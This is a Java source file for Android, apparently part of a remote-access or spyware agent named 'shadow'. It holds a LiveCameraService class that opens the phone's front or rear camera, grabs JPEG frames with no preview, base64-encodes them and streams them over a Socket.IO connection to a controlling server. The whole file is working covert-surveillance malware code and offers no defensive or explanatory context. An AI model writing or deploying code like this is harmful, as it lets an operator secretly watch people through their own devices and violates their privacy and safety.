package com.shadow.agent;

import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.Log;

import org.json.JSONObject;

import io.socket.client.Socket;

import java.nio.ByteBuffer;

public class LiveCameraService {

    private static final String TAG = "SHADOW_LIVE";
    private final Context context;
    private Socket socket;
    private CameraDevice camera;
    private CameraCaptureSession session;
    private ImageReader reader;
    private HandlerThread ht;
    private Handler handler;
    private volatile boolean streaming = false;

    public LiveCameraService(Context context) {
        this.context = context;
    }

    public void start(Socket socket, int facing) {
        this.socket = socket;
        streaming = true;

        ht = new HandlerThread("live-cam");
        ht.start();
        handler = new Handler(ht.getLooper());

        try {
            CameraManager cm = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
            if (cm == null) { Log.e(TAG, "No camera"); return; }

            String cameraId = null;
            for (String id : cm.getCameraIdList()) {
                CameraCharacteristics ch = cm.getCameraCharacteristics(id);
                Integer lens = ch.get(CameraCharacteristics.LENS_FACING);
                if (lens != null && lens == facing) { cameraId = id; break; }
            }
            if (cameraId == null) { Log.e(TAG, "Camera not found"); return; }

            reader = ImageReader.newInstance(320, 240, ImageFormat.JPEG, 2);
            reader.setOnImageAvailableListener(this::onFrame, handler);

            if (androidx.core.content.ContextCompat.checkSelfPermission(context,
                    android.Manifest.permission.CAMERA) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "No camera permission");
                return;
            }

            cm.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice cam) {
                    camera = cam;
                    try {
                        final CaptureRequest.Builder req = cam.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                        req.addTarget(reader.getSurface());
                        cam.createCaptureSession(java.util.Collections.singletonList(reader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(CameraCaptureSession sess) {
                                    session = sess;
                                    try {
                                        sess.setRepeatingRequest(req.build(), null, handler);
                                    } catch (Exception e) { Log.e(TAG, "Repeat error", e); }
                                }
                                @Override
                                public void onConfigureFailed(CameraCaptureSession sess) {}
                            }, handler);
                    } catch (Exception e) { Log.e(TAG, "Capture error", e); }
                }
                @Override
                public void onDisconnected(CameraDevice cam) { cam.close(); }
                @Override
                public void onError(CameraDevice cam, int err) { cam.close(); }
            }, handler);

        } catch (Exception e) { Log.e(TAG, "Start error", e); }
    }

    private void onFrame(ImageReader r) {
        if (!streaming) return;
        try {
            Image img = r.acquireLatestImage();
            if (img == null) return;
            ByteBuffer buf = img.getPlanes()[0].getBuffer();
            byte[] bytes = new byte[buf.remaining()];
            buf.get(bytes);
            img.close();

            String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);

            if (socket != null && socket.connected()) {
                JSONObject payload = new JSONObject();
                payload.put("frame", b64);
                payload.put("timestamp", System.currentTimeMillis());
                socket.emit("camera:frame", payload);
            }
        } catch (Exception ignored) {}
    }

    public void stop() {
        streaming = false;
        try { if (session != null) session.close(); } catch (Exception ignored) {}
        try { if (camera != null) camera.close(); } catch (Exception ignored) {}
        try { if (reader != null) reader.close(); } catch (Exception ignored) {}
        try { if (ht != null) ht.quitSafely(); } catch (Exception ignored) {}
        session = null;
        camera = null;
        reader = null;
    }
}